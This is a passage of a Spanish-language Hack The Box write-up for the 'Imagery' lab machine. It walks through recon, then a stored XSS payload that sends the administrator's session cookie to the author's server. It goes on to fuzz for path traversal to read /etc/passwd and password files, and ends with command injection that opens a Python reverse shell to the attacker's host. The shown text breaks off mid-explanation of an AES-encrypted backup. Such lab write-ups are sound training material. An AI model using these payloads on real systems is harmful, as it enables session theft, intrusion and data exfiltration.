---
title: "Imagery - Hack The Box"
date: 2025-10-04
draft: false
slug: "htb-writeup-imagery"
excerpt: "Esta es una máquina bastante complicada. Después de analizar los escaneos, nos dedicamos a analizar la página web activa en el puerto 8000. En dicha página, creamos un nuevo usuario y probamos las funcionalidades de la página, siendo así que logramos descubrir que un reporte de bugs, es vulnerable a Blind XSS y Stored XSS, logrando secuestrar la sesión (Session Hijacking) de un administrador. Revisando las funcionalidades de la sesión del administrador, identificamos el uso de un parámetro que resulta ser vulnerable a Local File Inclusion (LFI) y Directory Traversal. De esta forma, logramos leer un archivo interno que contiene las contraseñas hasheadas en MD5, que crackeamos y nos logueamos como otro usuario. Analizando la sesión del nuevo usuario, vemos que tiene funcionalidades bloqueadas en otras sesiones al subir una imagen. Analizamos una funcionalidad, descubriendo que es vulnerable a Inyección de Comandos (Command Injection), lo que nos permite mandarnos una Reverse Shell y ganando así, acceso principal a la máquina víctima. Enumerando la máquina, encontramos un archivo ZIP que está encriptado por pyAesCrypt. Utilizamos ChatGPT, para crear un script que aplica fuerza bruta a este archivo encriptado, logrando crackearlo y obteniendo el archivo ZIP. Descomprimiéndolo resulta ser un backup del servidor web, que contiene un archivo JSON con contraseñas hasheadas en MD5 de los usuarios de la máquina víctima, logueándonos como otro usuario. Revisando los privilegios de nuestro usuario, vemos que puede ejecutar el binario charcol como Root, pues dicho binario, permite crear tareas CRON que ejecutan comandos. Abusamos de esta función para darle permisos SUID a la Bash, siendo así que escalamos privilegios y nos convertimos en Root."
categories: ["HackTheBox", "Medium Machine"]
tags: ["Linux", "Werkzeug", "Web Enumeration", "Fuzzing", "BurpSuite", "Blind XSS", "Session Hijacking", "Stored XSS", "Local File Inclusion (LFI)", "Cracking Hash", "Cracking MD5 Hash", "Command Injection (CI)", "Cracking AES Encrypted File (pyAesCrypt)", "Abusing Sudoers Privileges On charcol Binary", "Privesc - Abusing Sudoers Privileges On charcol Binary", "OSCP Style"]
tools:
  - "ping"
  - "nmap"
  - "Wappalixer"
  - "whatweb"
  - "php"
  - "BurpSuite"
  - "wfuzz"
  - "Crackstation"
  - "tcpdump"
  - "python3"
  - "nc"
  - "ChatGPT"
  - "pwd"
  - "grep"
  - "wget"
  - "file"
  - "unzip"
  - "sudo"
  - "charcol"
  - "bash"
links:
  - "https://backtrackacademy.com/articulo/xss-capturando-cookies-de-sesion"
  - "https://owasp.org/www-community/attacks/Path_Traversal"
  - "https://www.revshells.com/"
  - "https://techbrunch.github.io/patt-mkdocs/Command%20Injection/#bypass-without-space"
  - "https://crackstation.net/"
  - "https://github.com/marcobellaccini/pyAesCrypt"
showtoc: true
header:
  teaser: "/assets/images/htb-writeup-imagery/imagery.png"
---

## Recopilación de Información {#Recopilacion}

### Traza ICMP {#Ping}

Vamos a realizar un ping para saber si la máquina está activa y en base al TTL veremos que SO opera en la máquina.
```bash
ping -c 4 10.10.11.88
PING 10.10.11.88 (10.10.11.88) 56(84) bytes of data.
64 bytes from 10.10.11.88: icmp_seq=1 ttl=63 time=69.0 ms
64 bytes from 10.10.11.88: icmp_seq=2 ttl=63 time=75.7 ms
64 bytes from 10.10.11.88: icmp_seq=3 ttl=63 time=344 ms
64 bytes from 10.10.11.88: icmp_seq=4 ttl=63 time=70.2 ms

--- 10.10.11.88 ping statistics ---
4 packets transmitted, 4 received, 0% packet loss, time 3013ms
rtt min/avg/max/mdev = 69.019/139.642/343.644/117.807 ms
```
Por el TTL sabemos que la máquina usa **Linux**, hagamos los escaneos de puertos y servicios.

### Escaneo de Puertos {#Puertos}

```bash
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.11.88 -oG allPorts
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.95 ( https://nmap.org ) at 2025-10-03 21:24 CST
Initiating SYN Stealth Scan at 21:24
Scanning 10.10.11.88 [65535 ports]
Discovered open port 22/tcp on 10.10.11.88
Discovered open port 8000/tcp on 10.10.11.88
Discovered open port 7777/tcp on 10.10.11.88
Completed SYN Stealth Scan at 21:24, 27.86s elapsed (65535 total ports)
Nmap scan report for 10.10.11.88
Host is up, received user-set (0.11s latency).
Scanned at 2025-10-03 21:24:23 CST for 28s
Not shown: 51656 closed tcp ports (reset), 13876 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT     STATE SERVICE  REASON
22/tcp   open  ssh      syn-ack ttl 63
7777/tcp open  cbt      syn-ack ttl 63
8000/tcp open  http-alt syn-ack ttl 63

Read data files from: /usr/share/nmap
Nmap done: 1 IP address (1 host up) scanned in 28.00 seconds
           Raw packets sent: 137670 (6.057MB) | Rcvd: 56990 (2.280MB)
```

| Parámetros | Descripción |
|---|---|
| *-p-*      | Para indicarle un escaneo en ciertos puertos. |
| *--open*   | Para indicar que aplique el escaneo en los puertos abiertos. |
| *-sS*      | Para indicar un TCP Syn Port Scan para que nos agilice el escaneo. |
| *--min-rate* | Para indicar una cantidad de envió de paquetes de datos no menor a la que indiquemos (en nuestro caso pedimos 5000). |
| *-vvv*     | Para indicar un triple verbose, un verbose nos muestra lo que vaya obteniendo el escaneo. |
| *-n*       | Para indicar que no se aplique resolución dns para agilizar el escaneo. |
| *-Pn*      | Para indicar que se omita el descubrimiento de hosts. |
| *-oG*      | Para indicar que el output se guarde en un fichero grepeable. Lo nombre allPorts. |

Veo 3 puertos abiertos, aunque me da curiosidad el **puerto 8000**.

### Escaneo de Servicios {#Servicios}

```bash
nmap -sCV -p 22,7777,8000 10.10.11.88 -oN targeted
Starting Nmap 7.95 ( https://nmap.org ) at 2025-10-03 21:27 CST
Nmap scan report for 10.10.11.88
Host is up (0.075s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 9.7p1 Ubuntu 7ubuntu4.3 (Ubuntu Linux; protocol 2.0)

| ssh-hostkey: 
|   256 35:94:fb:70:36:1a:26:3c:a8:3c:5a:5a:e4:fb:8c:18 (ECDSA)
|_  256 c2:52:7c:42:61:ce:97:9d:12:d5:01:1c:ba:68:0f:fa (ED25519)
7777/tcp open  http    SimpleHTTPServer 0.6 (Python 3.12.7)
8000/tcp open  http    Werkzeug httpd 3.1.3 (Python 3.12.7)

|_http-title: Image Gallery
|_http-server-header: Werkzeug/3.1.3 Python/3.12.7
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 100.12 seconds
```

| Parámetros | Descripción |
|---|---|
| *-sC*      | Para indicar un lanzamiento de scripts básicos de reconocimiento. |
| *-sV*      | Para identificar los servicios/versión que están activos en los puertos que se analicen. |
| *-p*       | Para indicar puertos específicos. |
| *-oN*      | Para indicar que el output se guarde en un fichero. Lo llame targeted. |

El escaneo nos está mostrando que hay 2 páginas web (en realidad solo hay una), pero nos enfocaremos en la página web del **puerto 8000** que muestra el uso de **Werkzeug**.

## Análisis de Vulnerabilidades {#Analisis}

### Analizando Página Web del Puerto 8000 (Werkzeug) {#Werkzeug}

Entremos:

<p align="center">
<img src="/assets/images/htb-writeup-imagery/Captura1.png">
</p>

Parece ser una página web dedicada a guardar y personalizar imágenes.

Veamos qué nos dice **Wappalizer**:

<p align="center">
<img src="/assets/images/htb-writeup-imagery/Captura2.png">
</p>

Casi no obtuvimos información sobre las tecnologías que usa la página.

Veamos si **whatweb** obtiene algo más:
```bash
whatweb http://10.10.11.88:8000
http://10.10.11.88:8000 [200 OK] Country[RESERVED][ZZ], Email[support@imagery.com], HTML5, HTTPServer[Werkzeug/3.1.3 Python/3.12.7], IP[10.10.11.88], Python[3.12.7], Script, Title[Image Gallery], Werkzeug[3.1.3]
```
No encontró algo más, pero sí obtuvo un email que quizá nos sirva para después.

Moviendonos un poco, encontraremos un login y una página donde nos podremos registrar:

<p align="center">
<img src="/assets/images/htb-writeup-imagery/Captura3.png">
</p>

No tenemos credenciales para el login, pero podemos registrar un nuevo usuario usando un correo y contraseña para la nueva cuenta:

<p align="center">
<img src="/assets/images/htb-writeup-imagery/Captura4.png">
</p>

Una vez que registramos nuestro usuario, nos manda al login:

<p align="center">
<img src="/assets/images/htb-writeup-imagery/Captura5.png">
</p>

Ya dentro, nos manda a una galería donde se guardarán las imágenes que carguemos y ahí podemos ver dónde podemos cargar las imágenes:

<p align="center">
<img src="/assets/images/htb-writeup-imagery/Captura6.png">
</p>

Analizando la página donde cargamos las imágenes, nos muestra varios tipos de imágenes que son aceptadas para subir:

<p align="center">
<img src="/assets/images/htb-writeup-imagery/Captura7.png">
</p>

Quizá podríamos subir una WebShell como si fuera un **GIF**, pero primero probemos subiendo un **GIF** random para saber como se almacenan:

<p align="center">
<img src="/assets/images/htb-writeup-imagery/Captura8.png">
</p>

<p align="center">
<img src="/assets/images/htb-writeup-imagery/Captura9.png">
</p>

No vemos el **GIF** porque no tiene nada como tal, pero vemos que tiene un símbolo de opciones.

Al verlas, solamente nos deja descargar o eliminar el archivo subido, aunque si le damos clic a las otras opciones desactivadas, nos da un mensaje de que aún están en producción:

<p align="center">
<img src="/assets/images/htb-writeup-imagery/Captura10.png">
</p>

Si revisamos la parte de abajo de la página, veremos que hay una opción que nos permite hacer un reporte de un bug:

<p align="center">
<img src="/assets/images/htb-writeup-imagery/Captura11.png">
</p>

Al entrar ahí, veremos dos campos de texto:

<p align="center">
<img src="/assets/images/htb-writeup-imagery/Captura12.png">
</p>

Podríamos probar si aquí podemos aplicar un **XSS**.

## Explotación de Vulnerabilidades {#Explotacion}

### Identificando Campo Vulnerable a XSS (Blind XSS) y Aplicando Secuestro de Sesión (Session Hijacking) Usando un Stored XSS {#StoredXSS}

Utilicemos un **XSS** básico para ver dos cosas, cómo funciona el envío de reporte y ver si se ejecuta el **XSS**:

<p align="center">
<img src="/assets/images/htb-writeup-imagery/Captura13.png">
</p>

<p align="center">
<img src="/assets/images/htb-writeup-imagery/Captura14.png">
</p>

Por lo que veo, el **XSS** no se ejecuta y, una vez que enviamos el reporte, nos dan un mensaje en el que se nos indica que el administrador revisará el reporte.

Esto me da a entender algunas cosas:
* Cualquier reporte subido, será revisado por un administrador.
* Si es que existe un **XSS Stored**, podríamos tratar de obtener la cookie del administrador y suplantar su identidad (**Session Hijacking**).

Aunque no vimos que se haya ejecutado el **XSS**, quizá podríamos redirigir la respuesta a un servidor de nosotros (**Blind XSS**).

Levanta un servidor con **PHP**:
```bash
php -S 0.0.0.0:8888
[Fri Oct  3 23:16:11 2025] PHP 8.4.11 Development Server (http://0.0.0.0:8000) started
```

Utiliza la siguiente **XSS** en cada campo:
```bash
# Usalo en el Bug Name
<img src="http://Tu_IP:8888/Summary" onerror=alert(window.origin)>

# Usalo en el Bug Details
<img src="http://Tu_IP:8888/Details" onerror=alert(window.origin)>
```

<p align="center">
<img src="/assets/images/htb-writeup-imagery/Captura15.png">
</p>

Envíalo, espera unos momentos y observa el servidor de **PHP**:
```bash
php -S 0.0.0.0:8888
[Fri Oct  3 23:16:11 2025] PHP 8.4.11 Development Server (http://0.0.0.0:8888) started
[Fri Oct  3 23:28:09 2025] 10.10.11.88:37030 Accepted
[Fri Oct  3 23:28:09 2025] 10.10.11.88:37030 [200]: GET /Details
[Fri Oct  3 23:28:09 2025] 10.10.11.88:37030 Closing
```
Excelente, obtuvimos una respuesta en el campo de **Bug Details**, siendo este campo el vulnerable a **XSS**.

Curiosamente, si dejamos el servidor de **PHP** activo, seguiremos obteniendo respuestas, lo que quiere decir que el payload se almacenó.

Entonces, podemos aplicar un **XSS Store** para robar la cookie de sesión del administrador.

Usemos el siguiente payload para obtener la **Cookie** del administrador:
```bash
<img src=x onerror="document.location='http://Tu_IP:8888/Cookie/'+document.cookie">
```

Ponlo en el campo de **Bug Details** y envíalo:

<p align="center">
<img src="/assets/images/htb-writeup-imagery/Captura16.png">
</p>

Observa el servidor de **PHP**:
```bash
php -S 0.0.0.0:8888
[Sun Oct  5 15:30:14 2025] PHP 8.4.11 Development Server (http://0.0.0.0:8888) started
[Sat Oct  4 00:18:08 2025] 10.10.11.88:53642 Accepted
[Sat Oct  4 00:18:08 2025] 10.10.11.88:53642 [200]: GET /Cookie/session=.eJw9jbEO...
[Sat Oct  4 00:18:08 2025] 10.10.11.88:53642 Closing
...
```
Muy bien, obtuvimos la cookie.

Para cargarla en nuestra sesión actual, podemos usar el inspector y pegar la cookie en la sección **Store**, en el valor de la cookie:

<p align="center">
<img src="/assets/images/htb-writeup-imagery/Captura17.png">
</p>

Ya la cargamos, ahora solo tienes que recargar la página y ya deberíamos ser el administrador:

<p align="center">
<img src="/assets/images/htb-writeup-imagery/Captura18.png">
</p>

Ya somos el administrador.

### Analizando Sesión de Administrador y Aplicando Local File Inclusion (LFI) en Página Admin Panel {#LFI}

Algo que podemos tratar de ver, es si ya tenemos habilitadas las opciones de producción que no teníamos como un usuario normal sobre una imagen cargada.

Pero al subir nuestro archivo **GIF**, no veremos las opciones habilitadas:

<p align="center">
<img src="/assets/images/htb-writeup-imagery/Captura19.png">
</p>

Ahora, entremos a esa página que dice **Admin Panel**:

<p align="center">
<img src="/assets/images/htb-writeup-imagery/Captura20.png">
</p>

**Nota**: Quizá tengas problemas para entrar a esta página, ya que es aquí donde se queda cargado el payload **XSS Stored**, por lo que te recomiendo cargar esta página en otra pestaña y tratar de descargar un log. Eso hace que se elimine el payload y podrás trabajar sin problemas.

Aquí podemos ver los usuarios que se han registrado, siendo el **usuario admin y tesuser**, unos usuarios pre cargados.

En cada uno podemos descargar sus logs:

<p align="center">
<img src="/assets/images/htb-writeup-imagery/Captura21.png">
</p>

Solamente son los logs de inicio de sesión de cada usuario.

Si capturamos la petición de descarga con **BurpSuite**, veremos el uso de un parámetro:

<p align="center">
<img src="/assets/images/htb-writeup-imagery/Captura22.png">
</p>

Ese parámetro llamado **log_identifier**, parece servir para descargar el archivo log de un usuario.

Esta clase de parámetros que descargar archivos, puede que sean vulnerables a **Local File Inclusion**.

Podemos comprobarlo con la herramienta **wfuzz**, usando la cookie de sesión actual y la ruta en donde se usa este parámetro:
```bash
wfuzz -c --hc=404 --hh=186 -t 300 -b 'session=cookie' -w /usr/share/wordlists/seclists/Fuzzing/LFI/LFI-Jhaddix.txt http://10.10.11.88:8000/admin/get_system_log?log_identifier=FUZZ
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://10.10.11.88:8000/admin/get_system_log?log_identifier=FUZZ
Total requests: 929

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                                      
=====================================================================

000000131:   200        23 L     206 W      1136 Ch     "/etc/crontab"                                                                                                               
000000138:   200        64 L     64 W       866 Ch      "/etc/group"                                                                                                                 
000000023:   200        38 L     54 W       1982 Ch     "..%2F..%2F..%2F%2F..%2F..%2Fetc/passwd"                                                                                     
000000021:   500        1 L      8 W        152 Ch      "..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fshadow"                                                        
000000311:   200        38 L     54 W       1982 Ch     "../../../../../../etc/passwd&=%3C%3C%3C%3C"                                                                                 
000000016:   200        38 L     54 W       1982 Ch     "/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd"                                          
000000017:   500        1 L      8 W        124 Ch      "/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/shadow"                                          
000000020:   200        38 L     54 W       1982 Ch     "..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd"                                                        
000000024:   500        1 L      8 W        135 Ch      "..%2F..%2F..%2F%2F..%2F..%2Fetc/shadow"                                                                                     
000000408:   500        1 L      8 W        116 Ch      "/./././././././././././etc/shadow"                                                                                          
000000409:   500        1 L      8 W        124 Ch      "/../../../../../../../../../../etc/shadow"                                                                                  
000000412:   500        1 L      8 W        94 Ch       "/etc/shadow"                                                                                                                
000000413:   500        1 L      8 W        155 Ch      "../../../../../../../../../../../../etc/shadow"                                                                             
000000400:   200        41 L     120 W      911 Ch      "/etc/rpc"                                                                                                                   
000000399:   200        23 L     142 W      920 Ch      "/etc/resolv.conf"                                                                                                           
000000135:   200        12 L     90 W       675 Ch      "/etc/fstab"                                                                                                                 
000000422:   200        131 L    429 W      3545 Ch     "/etc/ssh/sshd_config"                                                                                                       
000000423:   500        1 L      8 W        95 Ch       "/etc/sudoers"                                                                                                               
000000237:   200        2 L      4 W        20 Ch       "/etc/issue"                                                                                                                 
000000206:   200        9 L      26 W       234 Ch      "../../../../../../../../../../../../etc/hosts"                                                                              
000000259:   200        38 L     54 W       1982 Ch     "../../../../../../../../../../../../../../../../../../../../../etc/passwd"                                                  
000000258:   200        38 L     54 W       1982 Ch     "../../../../../../../../../../../../../../../../../../../../../../etc/passwd"                                               
000000250:   200        20 L     65 W       526 Ch      "/etc/nsswitch.conf"                                                                                                         
000000249:   200        19 L     103 W      767 Ch      "/etc/netconfig"                                                                                                             
000000253:   200        38 L     54 W       1982 Ch     "/./././././././././././etc/passwd"                                                                                          
000000254:   200        38 L     54 W       1982 Ch     "/../../../../../../../../../../etc/passwd"                                                                                  
000000257:   200        38 L     54 W       1982 Ch     "/etc/passwd"                                                                                                                
000000129:   200        1 L      7 W        70 Ch       "/etc/apt/sources.list"                                                                                                      
000000264:   200        38 L     54 W       1982 Ch     "../../../../../../../../../../../../../../../../etc/passwd"                                                                 
000000274:   200        38 L     54 W       1982 Ch     "../../../../../../etc/passwd"                                                                                               
000000208:   200        10 L     57 W       411 Ch      "/etc/hosts.allow"                                                                                                           
000000260:   200        38 L     54 W       1982 Ch     "../../../../../../../../../../../../../../../../../../../../etc/passwd"                                                     
000000266:   200        38 L     54 W       1982 Ch     "../../../../../../../../../../../../../../etc/passwd"                                                                       
000000276:   200        38 L     54 W       1982 Ch     "../../../../etc/passwd"                                                                                                     
000000268:   200        38 L     54 W       1982 Ch     "../../../../../../../../../../../../etc/passwd"                                                                             
000000273:   200        38 L     54 W       1982 Ch     "../../../../../../../etc/passwd"                                                                                            
000000269:   200        38 L     54 W       1982 Ch     "../../../../../../../../../../../etc/passwd"                                                                                
000000275:   200        38 L     54 W       1982 Ch     "../../../../../etc/passwd"                                                                                                  
000000261:   200        38 L     54 W       1982 Ch     "../../../../../../../../../../../../../../../../../../../etc/passwd"                                                        
000000267:   200        38 L     54 W       1982 Ch     "../../../../../../../../../../../../../etc/passwd"                                                                          
000000205:   200        9 L      26 W       234 Ch      "/etc/hosts"                                                                                                                 
000000272:   200        38 L     54 W       1982 Ch     "../../../../../../../../etc/passwd"                                                                                         
000000271:   200        38 L     54 W       1982 Ch     "../../../../../../../../../etc/passwd"                                                                                      
000000263:   200        38 L     54 W       1982 Ch     "../../../../../../../../../../../../../../../../../etc/passwd"                                                              
000000270:   200        38 L     54 W       1982 Ch     "../../../../../../../../../../etc/passwd"                                                                                   
000000265:   200        38 L     54 W       1982 Ch     "../../../../../../../../../../../../../../../etc/passwd"                                                                    
000000262:   200        38 L     54 W       1982 Ch     "../../../../../../../../../../../../../../../../../../etc/passwd"                                                           
000000209:   200        17 L     111 W      711 Ch      "/etc/hosts.deny"                                                                                                            
000000509:   200        0 L      0 W        0 Ch        "/proc/self/status"                                                                                                          
000000508:   200        0 L      0 W        0 Ch        "/proc/self/environ"                                                                                                         
000000507:   200        0 L      0 W        0 Ch        "/proc/self/cmdline"                                                                                                         
000000499:   200        0 L      0 W        0 Ch        "/proc/loadavg"                                                                                                              
000000498:   200        0 L      0 W        0 Ch        "/proc/interrupts"                                                                                                           
000000502:   200        0 L      0 W        0 Ch        "/proc/net/arp"                                                                                                              
000000510:   200        0 L      0 W        0 Ch        "/proc/version"                                                                                                              
000000506:   200        0 L      0 W        0 Ch        "/proc/partitions"                                                                                                           
000000503:   200        0 L      0 W        0 Ch        "/proc/net/dev"                                                                                                              
000000500:   200        0 L      0 W        0 Ch        "/proc/meminfo"                                                                                                              
000000504:   200        0 L      0 W        0 Ch        "/proc/net/route"                                                                                                            
000000497:   200        0 L      0 W        0 Ch        "/proc/cpuinfo"                                                                                                              
000000501:   200        0 L      0 W        0 Ch        "/proc/mounts"                                                                                                               
000000505:   200        0 L      0 W        0 Ch        "/proc/net/tcp"                                                                                                              
000000736:   500        1 L      8 W        98 Ch       "/var/log/syslog"                                                                                                            
000000741:   200        0 L      1 W        8441 Ch     "/var/log/wtmp"                                                                                                              
000000698:   500        1 L      8 W        100 Ch      "/var/log/kern.log"                                                                                                          
000000699:   200        0 L      0 W        0 Ch        "/var/log/lastlog"                                                                                                           
000000671:   500        1 L      8 W        100 Ch      "/var/log/auth.log"                                                                                                          
000000674:   500        1 L      8 W        97 Ch       "/var/log/dmesg"                                                                                                             
000000750:   200        0 L      3 W        2687 Ch     "/var/run/utmp"                                                                                                              
000000929:   200        38 L     54 W       1982 Ch     "///////../../../etc/passwd"                                                                                                 

Total time: 0
Processed Requests: 929
Filtered Requests: 859
Requests/sec.: 0
```

| Parámetros | Descripción |
|---|---|
| *-c*       | Para ver el resultado en un formato colorido. |
| *--hc*     | Para no mostrar un código de estado en los resultados. |
| *--hh*     | Para no mostrar respuestas con la cantidad de caracteres especificada. |
| *-t*       | Para indicar la cantidad de hilos a usar. |
| *-b*       | Para usar una cookie de sesión. |
| *-w*       | Para indicar el diccionario a usar en el fuzzing. |

Excelente, es vulnerable.

Pero analizando la respuesta, parece que también es vulnerable a **Path Traversal / Directory Traversal**.

Comprobemos ambos:

<p align="center">
<img src="/assets/images/htb-writeup-imagery/Captura23.png">
</p>

<p align="center">
<img src="/assets/images/htb-writeup-imagery/Captura24.png">
</p>

Es vulnerable a ambos.

Algo que podemos hacer, ya que es un servidor **Werkzeug**, es ver los archivos locales comunes de este servidor. Por ejemplo:
* **app.py**
* **config.py**
* **utils.py**

Nos enfocaremos en el archivo **config.py**, así que tratemos de leerlo:

<p align="center">
<img src="/assets/images/htb-writeup-imagery/Captura25.png">
</p>

Lo encontramos.

Observa que el archivo menciona el uso de un archivo llamado **db.json**.

Vamos a verlo:

<p align="center">
<img src="/assets/images/htb-writeup-imagery/Captura26.png">
</p>

Excelente, hemos encontrado las contraseñas de los dos usuarios registrados en la página web.

Sus contraseñas parecen ser codificadas en **MD5**.

Las podemos intentar crackear con la página **Crackstation**:
* <a href="https://crackstation.net/" target="_blank">Crackstation</a>

Probémoslo:

<p align="center">
<img src="/assets/images/htb-writeup-imagery/Captura27.png">
</p>

No pudimos crackear la contraseña del usuario admin, pero sí la del **usuario testuser**.

### Analizando Sesión de Usuario testuser y Aplicando Inyección de Comandos (Command Injection) para Obtener una Reverse Shell {#CI}

Entremos a su sesión:

<p align="center">
<img src="/assets/images/htb-writeup-imagery/Captura28.png">
</p>

En esta sesión, ya tendremos habilitadas las opciones que antes no teníamos al subir una imagen:

<p align="center">
<img src="/assets/images/htb-writeup-imagery/Captura29.png">
</p>

Vemos que hay varias funcionalidades, pero la interesante, es la funcionalidad **Transform Image**:

<p align="center">
<img src="/assets/images/htb-writeup-imagery/Captura30.png">
</p>

Dentro de esta funcionalidad, tenemos algunas operaciones para modificar varias cosillas de la imagen, como el tamaño, el brillo, la saturación, etc.

Vamos a enfocarnos en la operación **Crop** que es para modificar el tamaño de la imagen y capturamos la ejecución de la operación:

<p align="center">
<img src="/assets/images/htb-writeup-imagery/Captura31.png">
</p>

Observa cómo la data se envía en un **formato JSON**:
* Se necesita el ID de la imagen para modificarla. En caso de que borren tu imagen, necesitarás capturar de nuevo la petición con otra imagen.
* Ahí se muestra la operación usada.
* Y los parámetros son los que indican cómo modificar el tamaño de la imagen.

Pensando un poco cómo es que se modifica la imagen, supongamos que usan alguna librería que sirve necesita X cantidad de parámetros.

Es posible que entre esos parámetros dados, podamos inyectar algún comando, así que intentémoslo en cualquiera de los parámetros.

Tratando de listar los archivos, parece que funciona a mediar, siendo que nos muestra un error al usar el comando **ls**:

<p align="center">
<img src="/assets/images/htb-writeup-imagery/Captura32.png">
</p>

El comando **sleep** sí funciona dentro del parámetro:

<p align="center">
<img src="/assets/images/htb-writeup-imagery/Captura33.png">
</p>

También el comando **curl**:

<p align="center">
<img src="/assets/images/htb-writeup-imagery/Captura34.png">
</p>

Ya comprobamos que sí se pueden ejecutar algunos comandos, pero tendremos problemas intentando inyectar nuestra **Reverse Shell** de **Bash**.

Otra opción es el uso de **python3** para ejecutar comandos, que al probarlo, no se ve que se ejecute el comando, pero la página toma el parámetro como correcto y no muestra error:

<p align="center">
<img src="/assets/images/htb-writeup-imagery/Captura35.png">
</p>

Intentemos mandarnos una **traza ICMP**.

Abre un capturador de **paquetes ICMP** con **tcpdump**:
```bash
tcpdump -i eth0 icmp -n
tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
listening on eth0, link-type EN10MB (Ethernet), snapshot length 262144 bytes
```

Usa el siguiente comando que envía un ping con solo un paquete:
```bash
"0; python3 -c 'import os;os.system(\"ping -c 1 Tu_IP\")'"
```

<p align="center">
<img src="/assets/images/htb-writeup-imagery/Captura36.png">
</p>

Observa el **tcpdump**:
```bash
tcpdump -i eth0 icmp -n
tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
listening on eth0, link-type EN10MB (Ethernet), snapshot length 262144 bytes
21:25:43.382411 IP 192.168.100.1 > Tu_IP: ICMP echo request, id 18, seq 0, length 64
21:25:43.382432 IP Tu_IP > 192.168.100.1: ICMP echo reply, id 18, seq 0, length 64
...
8 packets captured
8 packets received by filter
0 packets dropped by kernel
```
Excelente, si funciona la inyección y tenemos conexión con la máquina víctima.

Vamos a mandarnos una **Reverse Shell**.

Abre un listener con **netcat**:
```bash
nc -nvlp 443
listening on [any] 443 ...
```

Usa la siguiente **Reverse Shell**:
```bash
"0; python3 -c 'import os,pty,socket;s=socket.socket();s.connect((\"Tu_IP\",443));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn(\"bash\")'"
```
Y envíala.

Observa la **netcat**:
```bash
nc -nvlp 443
listening on [any] 443 ...
connect to [Tu_IP] from (UNKNOWN) [10.10.11.88] 35258
web@Imagery:~/web$ whoami
whoami
web
```

Ya solo obtengamos una sesión interactiva:
```bash
# Paso 1:
script /dev/null -c bash

# Paso 2:
CTRL + Z

# Paso 3:
stty raw -echo; fg

# Paso 4:
reset -> xterm

# Paso 5:
export TERM=xterm && export SHELL=bash && stty rows 51 columns 189
```

## Post Explotación {#Post}

### Enumeración de la Máquina Víctima y Aplicando Fuerza Bruta a Archivo AES con Script de Python {#AES}

Al ganar acceso, estamos dentro del directorio web donde está desplegado el servidor de la página:
```bash
web@Imagery:~/web$ pwd
/home/web/web
web@Imagery:~/web$ ls
api_admin.py  api_edit.py    api_misc.py    app.py  config.py  env          static       templates  utils.py
api_auth.py   api_manage.py  api_upload.py  bot     db.json    __pycache__  system_logs  uploads
```

El script vulnerable a inyección de comandos es el **api_edit.py**, siendo la parte donde maneja los parámetros la que no sanitiza la entrada de estos, lo que permitió la inyección:
```bash
if transform_type == 'crop':
            x = str(params.get('x'))
            y = str(params.get('y'))
            width = str(params.get('width'))
            height = str(params.get('height'))
            command = f"{IMAGEMAGICK_CONVERT_PATH} {original_filepath} -crop {width}x{height}+{x}+{y} {output_filepath}"
            subprocess.run(command, capture_output=True, text=True, shell=True, check=True)
```
Solo la operación **Crop** es la que parece ser vulnerable.

Veamos qué usuarios existen en la máquina:
```bash
web@Imagery:~$ cat /etc/passwd | grep 'bash'
root:x:0:0:root:/root:/bin/bash
web:x:1001:1001::/home/web:/bin/bash
mark:x:1002:1002::/home/mark:/bin/bash
```
Hay 2 usuarios aparte del **Root** y ahora somos el **usuario web**.

Buscando un poco más, encontramos un directorio de **Google Chrome** en el directorio `/opt`:
```bash
web@Imagery:~$ ls /opt/google/chrome/
chrome                     CHROME_VERSION_EXTRA  icudtl.dat                         libvk_swiftshader.so                 product_logo_16.png   product_logo_64.png      xdg-settings
chrome_100_percent.pak     cron                  libEGL.so                          libvulkan.so.1                       product_logo_24.png   resources.pak
chrome_200_percent.pak     default-app-block     libGLESv2.so                       locales                              product_logo_256.png  v8_context_snapshot.bin
chrome_crashpad_handler    default_apps          liboptimization_guide_internal.so  MEIPreload                           product_logo_32.png   vk_swiftshader_icd.json
chrome-management-service  extensions            libqt5_shim.so                     PrivacySandboxAttestationsPreloaded  product_logo_32.xpm   WidevineCdm
chrome-sandbox             google-chrome         libqt6_shim.so                     product_logo_128.png                 product_logo_48.png   xdg-mime
```
Pero de momento no encuentro algo útil por aquí.

Un directorio que siempre hay que revisar, es el `/var/backup`, pues puede contener algún backup hecho por un usuario, siendo este el caso:
```bash
web@Imagery:~$ ls -la /var/backup
total 22524
drwxr-xr-x  2 root root     4096 Sep 22 18:56 .
drwxr-xr-x 14 root root     4096 Sep 22 18:56 ..
-rw-rw-r--  1 root root 23054471 Aug  6  2024 web_20250806_120723.zip.aes
```

Vamos a enviar este archivo a nuestra máquina, usando un servidor de **python3**:
```bash
web@Imagery:~$ cd /var/backup
web@Imagery:/var/backup$ python3 -m http.server 1337
Serving HTTP on 0.0.0.0 port 1337 (http://0.0.0.0:1337/) ...
```

Y lo descargamos con **wget**:
```bash
wget http://10.10.11.88:1337/web_20250806_120723.zip.aes
```
Listo, analicemos el archivo.

Usando el comando **file**, nos da un poco más de información:
```bash
file web_20250806_120723.zip.aes
web_20250806_120723.zip.aes: AES encrypted data, version 2, created by "pyAesCrypt 6.1.1"
```
Es un archivo encriptado en **AES** por **pyAesCrypt 6.1.1**.

Investiguemos qué es el **encriptado AES**:

| **Encriptado AES** |
|:-----------------:|
